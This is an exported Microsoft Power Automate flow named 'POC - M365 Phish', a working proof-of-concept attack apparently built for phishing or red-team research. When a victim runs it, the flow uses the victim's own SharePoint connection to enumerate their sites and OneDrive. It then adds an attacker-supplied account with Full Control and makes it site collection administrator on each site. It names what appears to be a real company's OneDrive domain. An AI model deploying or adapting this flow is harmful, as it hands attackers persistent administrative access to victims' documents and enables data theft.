{"name":"28e8e1a7-bd12-40fa-b69b-71274bbe02b5","id":"/providers/Microsoft.Flow/flows/28e8e1a7-bd12-40fa-b69b-71274bbe02b5","type":"Microsoft.Flow/flows","properties":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_logicflows","displayName":"POC - M365 Phish ","definition":{"metadata":{"workflowEntityId":null,"processAdvisorMetadata":null,"flowclientsuspensionreason":"None","flowclientsuspensiontime":null,"creator":{"id":"141bbffc-8a3b-4297-8d8b-a0bbbb7690db","type":"User","tenantId":"27fb6ed6-a5e6-40e4-bf9c-e13b8db5ebd6"},"provisioningMethod":"FromDefinition","failureAlertSubscription":true,"clientLastModifiedTime":"2022-05-13T06:25:10.7394287Z"},"$schema":"https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#","contentVersion":"1.0.0.0","parameters":{"$connections":{"defaultValue":{},"type":"Object"},"$authentication":{"defaultValue":{},"type":"SecureObject"}},"triggers":{"manual":{"metadata":{"operationMetadataId":"b78982fd-b4a4-432e-8ead-755df2af7ac8"},"type":"Request","kind":"PowerApp","inputs":{"schema":{"type":"object","properties":{"Initializevariable-victimemail_Value":{"type":"string","description":"Enter initial value","x-ms-powerflows-param-ispartial":false},"Compose-rootsiteurl_Inputs":{"type":"any","description":"Inputs. This parameter is used as part of \"9A804B3E-9A04-458E-A29C-D1824C384494\"","x-ms-powerflows-param-ispartial":true},"Initializevariable-givepermissionstouser_Value":{"type":"string","description":"Enter initial value","x-ms-powerflows-param-ispartial":false}},"required":["Initializevariable-victimemail_Value","Compose-rootsiteurl_Inputs","Initializevariable-givepermissionstouser_Value"]}}}},"actions":{"Initialize_variable_-_give_permissions_to_user":{"runAfter":{"Initialize_variable_-_victim_email":["Succeeded"]},"metadata":{"operationMetadataId":"144eb102-316e-442f-a091-23f69ae100b7"},"type":"InitializeVariable","inputs":{"variables":[{"name":"attackerEmail","type":"string","value":"@triggerBody()['Initializevariable-givepermissionstouser_Value']"}]}},"Initialize_variable_-_SharePoint_urls":{"runAfter":{"Initialize_variable_-_give_permissions_to_user":["Succeeded"]},"metadata":{"operationMetadataId":"e5219e4a-2fcd-46a2-8bce-2dbdab9044e1"},"type":"InitializeVariable","inputs":{"variables":[{"name":"urls","type":"array"}]}},"Initialize_variable_-_roleID":{"runAfter":{"Initialize_variable_-_SharePoint_urls":["Succeeded"]},"metadata":{"operationMetadataId":"e160b95b-2dcf-47c6-bc5e-3bbd59287255"},"type":"InitializeVariable","inputs":{"variables":[{"name":"roleID","type":"string"}]}},"Scope_-_Collect_Urls":{"actions":{"Compose":{"runAfter":{"Send_an_HTTP_request_to_SharePoint_-_get_sites":["Succeeded"]},"metadata":{"operationMetadataId":"3beef4eb-6ef7-4d0e-bded-3e4fa8e4090e"},"type":"Compose","inputs":"@outputs('Send_an_HTTP_request_to_SharePoint_-_get_sites')?['body']?['d']?['query']?['PrimaryQueryResult']?['RelevantResults']?['Table']?['Rows']?['results']"},"Apply_to_each":{"foreach":"@outputs('Send_an_HTTP_request_to_SharePoint_-_get_sites')?['body']?['d']?['query']?['PrimaryQueryResult']?['RelevantResults']?['Table']?['Rows']?['results']","actions":{"Append_to_array_variable":{"runAfter":{},"metadata":{"operationMetadataId":"e8d783cc-e7a8-4693-89fe-acb28fdeb300"},"type":"AppendToArrayVariable","inputs":{"name":"urls","value":"@item()?['Cells']?['results'][1]?['value']"}}},"runAfter":{"Compose":["Succeeded"]},"metadata":{"operationMetadataId":"95a15977-5e69-40d6-be8d-c6e31ee261cb"},"type":"Foreach","runtimeConfiguration":{"concurrency":{"repetitions":50}}},"Send_an_HTTP_request_to_SharePoint_-_get_sites":{"runAfter":{},"metadata":{"operationMetadataId":"9b36ec1a-99f8-497e-89ad-69dfc951d264"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_sharepointonline","connectionName":"shared_sharepointonline_1","operationId":"HttpRequest"},"parameters":{"dataset":"@outputs('Compose_-_root_site_url')","parameters/method":"POST","parameters/uri":"/_api/search/query?querytext='contentclass%3aSTS_Site'&rowlimit=5&selectproperties='Title%2cUrl%2cPath%2cParentLink'&clienttype='ContentSearchRegular'"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}},"description":"Pagination: https://docs.microsoft.com/en-us/sharepoint/dev/general-development/pagination-for-large-result-sets"}},"runAfter":{"Compose_-_root_site_url":["Succeeded"]},"metadata":{"operationMetadataId":"19da3976-d2f2-4c91-b27f-329bec9cbbd2"},"type":"Scope"},"Apply_to_each_-_SharePoint_Site":{"foreach":"@variables('urls')","actions":{"Apply_to_each_-_role":{"foreach":"@outputs('Send_an_HTTP_request_to_SharePoint_-_get_roles')?['body']?['d']?['results']","actions":{"Compose_2":{"runAfter":{},"metadata":{"operationMetadataId":"711cb177-610d-46dd-a578-cb6ea7c1a9f5"},"type":"Compose","inputs":"@item()"},"Condition":{"actions":{"Set_variable_2":{"runAfter":{},"metadata":{"operationMetadataId":"8dd81450-9ba6-4f2e-857a-96d6117deb58"},"type":"SetVariable","inputs":{"name":"roleID","value":"@{item()?['id']}"}}},"runAfter":{"Compose_2":["Succeeded"]},"expression":{"contains":["@item()?['Name']","Full Control"]},"metadata":{"operationMetadataId":"91a4e9da-954c-49c7-aba7-3e1065dc9c85"},"type":"If"}},"runAfter":{"Compose_-_url":["Succeeded"]},"metadata":{"operationMetadataId":"bc35f302-3d79-4a07-ba72-ec28f1216af9"},"type":"Foreach","runtimeConfiguration":{"concurrency":{"repetitions":50}}},"Compose_-_url":{"runAfter":{"Send_an_HTTP_request_to_SharePoint_-_get_roles":["Succeeded"]},"metadata":{"operationMetadataId":"4addbbf6-0bfc-45c4-ad6d-77a2d7e55212"},"type":"Compose","inputs":"@item()"},"Send_an_HTTP_request_to_SharePoint_-_get_roles":{"runAfter":{},"metadata":{"operationMetadataId":"90b5cf9e-61e9-45e7-9bc8-ecf3b4cf8145"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_sharepointonline","connectionName":"shared_sharepointonline_1","operationId":"HttpRequest"},"parameters":{"dataset":"@item()","parameters/method":"GET","parameters/uri":"/_api/web/roledefinitions"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}}},"Send_an_HTTP_request_to_SharePoint_-_get_users":{"runAfter":{"Send_an_HTTP_request_to_SharePoint_-_ensureuser":["Succeeded"]},"metadata":{"operationMetadataId":"46953c4f-966b-4ceb-a8ff-b3ed2f1a1305"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_sharepointonline","connectionName":"shared_sharepointonline_1","operationId":"HttpRequest"},"parameters":{"dataset":"@outputs('Compose_-_url')","parameters/method":"GET","parameters/uri":"/_api/web/siteusers?$filter=Email eq '@{variables('attackerEmail')}'"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}}},"Compose_-_user_id":{"runAfter":{"Send_an_HTTP_request_to_SharePoint_-_get_users":["Succeeded"]},"metadata":{"operationMetadataId":"99b67e02-b71a-4bb8-8d7e-5018c45572fe"},"type":"Compose","inputs":"@outputs('Send_an_HTTP_request_to_SharePoint_-_get_users')?['body']?['d']?['results'][0]?['Id']"},"Send_an_HTTP_request_to_SharePoint_-_add_user_as_full_control":{"runAfter":{"Compose_-_user_id":["Succeeded"]},"metadata":{"operationMetadataId":"dee093c0-f1b2-4bb2-b141-c6b882bdd22e"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_sharepointonline","connectionName":"shared_sharepointonline_1","operationId":"HttpRequest"},"parameters":{"dataset":"@outputs('Compose_-_url')","parameters/method":"POST","parameters/uri":"/_api/web/roleassignments/addroleassignment(principalid=@{outputs('Compose_-_user_id')},roleDefId=@{variables('roleID')})"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}}},"Send_an_HTTP_request_to_SharePoint_-_ensureuser":{"runAfter":{"Apply_to_each_-_role":["Succeeded"]},"metadata":{"operationMetadataId":"f8c4c6c1-d768-4d16-861f-22b6d67f9aa2"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_sharepointonline","connectionName":"shared_sharepointonline_1","operationId":"HttpRequest"},"parameters":{"dataset":"@outputs('Compose_-_url')","parameters/method":"POST","parameters/uri":"/_api/web/ensureuser","parameters/headers":{"content-type":"application/json"},"parameters/body":"{ 'logonName': 'i:0#.f|membership|@{variables('attackerEmail')}'}"},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}}},"Send_an_HTTP_request_to_SharePoint_-_set_Site_Collection_Administrator":{"runAfter":{"Send_an_HTTP_request_to_SharePoint_-_add_user_as_full_control":["Succeeded"]},"metadata":{"operationMetadataId":"2ad236d3-8706-4ea1-8ddf-e970c3776ac3"},"type":"OpenApiConnection","inputs":{"host":{"apiId":"/providers/Microsoft.PowerApps/apis/shared_sharepointonline","connectionName":"shared_sharepointonline_1","operationId":"HttpRequest"},"parameters":{"dataset":"@outputs('Compose_-_url')","parameters/method":"POST","parameters/uri":"/_api/web/GetUserById(@{outputs('Compose_-_user_id')})","parameters/headers":{"content-type":"application/json","X-HTTP-Method":"MERGE","If-Match":"*"},"parameters/body":"{  \n 'IsSiteAdmin': 'true'\n }  "},"authentication":{"value":"@json(decodeBase64(triggerOutputs().headers['X-MS-APIM-Tokens']))['$ConnectionKey']","type":"Raw"}},"description":"https://social.msdn.microsoft.com/Forums/en-US/bbb44006-ff7d-47fe-b753-db0f38b33c06/how-to-add-site-collection-administrator-in-sharepoint-online-using-rest-api?forum=sharepointdevelopment"}},"runAfter":{"Append_to_array_variable_2":["Succeeded"]},"metadata":{"operationMetadataId":"7dbb0d33-11ef-47d3-b32d-6a69db66619c"},"type":"Foreach"},"Compose_-_OneDrive_URL":{"runAfter":{"Scope_-_Collect_Urls":["Succeeded"]},"metadata":{"operationMetadataId":"02ddc76b-770a-4873-8063-5dbf1386b216"},"type":"Compose","inputs":"@concat('https://dteenergy-my.sharepoint.com/personal/', replace(replace(variables('runnerEmail'), '@', '.'), '.', '_'))"},"Compose_-_root_site_url":{"runAfter":{"Initialize_variable_-_roleID":["Succeeded"]},"metadata":{"operationMetadataId":"8d430123-aaf8-4128-83e6-3e0e1ab9b96f"},"type":"Compose","inputs":"https://@{triggerBody()['Compose-rootsiteurl_Inputs']}.sharepoint.com/"},"Initialize_variable_-_victim_email":{"runAfter":{},"metadata":{"operationMetadataId":"49875a73-43a0-475a-b4f3-33ef7889f9a5"},"type":"InitializeVariable","inputs":{"variables":[{"name":"runnerEmail","type":"string","value":"@{triggerBody()['Initializevariable-victimemail_Value']}"}]}},"Append_to_array_variable_2":{"runAfter":{"Compose_-_OneDrive_URL":["Succeeded"]},"metadata":{"operationMetadataId":"8634d0bd-dd73-4d8e-a6de-aee9efc4db87"},"type":"AppendToArrayVariable","inputs":{"name":"urls","value":"@outputs('Compose_-_OneDrive_URL')"}}},"outputs":{}},"connectionReferences":{"shared_sharepointonline_1":{"connectionName":"245bb81575afd8db188bbf6b3c4a915a","source":"Invoker","id":"/providers/Microsoft.PowerApps/apis/shared_sharepointonline","tier":"NotSpecified"}},"flowFailureAlertSubscribed":false,"isManaged":false}}